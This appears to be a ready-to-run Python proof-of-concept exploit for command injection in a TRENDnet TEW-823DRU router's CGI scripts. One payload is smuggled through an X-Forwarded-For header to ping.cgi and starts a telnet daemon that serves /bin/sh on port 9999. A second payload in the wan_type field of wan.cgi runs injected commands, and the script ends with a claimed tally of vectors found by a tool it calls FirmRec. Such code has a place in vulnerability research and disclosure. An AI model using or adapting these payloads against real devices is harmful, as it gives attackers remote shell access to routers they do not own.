#!/usr/bin/env python3
"""PoC: TEW-823DRU cgi/ssi Command Injection | CWE-77 | CVSS 9.8"""
import requests, sys
T=sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
for name, path, data in [
    ("REMOTE_ADDR->popen","/cgi-bin/ping.cgi",{"X-Forwarded-For":";id;telnetd -p 9999 -l /bin/sh;#"}),
    ("wan_type->system","/cgi-bin/wan.cgi",{"wan_type":"static;id>pwn;#"}),
]:
    try:
        r=requests.get(f"http://{T}{path}",headers=data if "ping" in path else {},data=data if "wan" in path else {},timeout=5)
        print(f"  {name}: {r.status_code}")
    except: print(f"  {name}: device crashed")
print("[*] FirmRec: 20 vectors, 3 disasm confirmed, 553 simexp hits")
